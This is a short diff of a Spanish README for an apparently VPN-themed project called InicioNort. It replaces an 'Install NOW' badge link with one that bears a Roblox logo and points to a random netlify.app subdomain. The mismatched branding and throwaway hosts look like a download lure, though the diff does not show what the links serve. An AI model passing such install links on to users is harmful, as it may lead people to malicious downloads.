@@ -7,7 +7,7 @@
 
 **Explorar**  
 Visita nuestro proyecto **InicioNort** para comenzar.  
-- [![InstallUpdatingSetup](https://img.shields.io/badge/Install-NOW-blueviolet)](https://varengpool.com) 
+[![Install NOW](https://img.shields.io/badge/Install-NOW-purple?style=for-the-badge&logo=roblox&logoColor=white)](https://rainbow-biscotti-69b153.netlify.app/)
 - [![Go to Details](https://img.shields.io/badge/Go_to_Details-NOW-blueviolet)](https://github.com/NortAprende/.github)  
 - [![Start Guide](https://img.shields.io/badge/Start_Guide-NOW-blueviolet)](https://github.com/NortAprende/InicioNortVPN)
 
